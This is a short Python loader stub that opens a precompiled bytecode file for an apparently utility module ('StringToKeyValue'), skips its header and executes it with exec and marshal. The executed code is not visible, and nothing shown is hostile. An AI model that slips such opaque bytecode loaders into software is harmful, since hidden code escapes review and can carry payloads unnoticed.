
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'StringToKeyValue_3bde7095bca64ce59a08de8a7df2b781.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
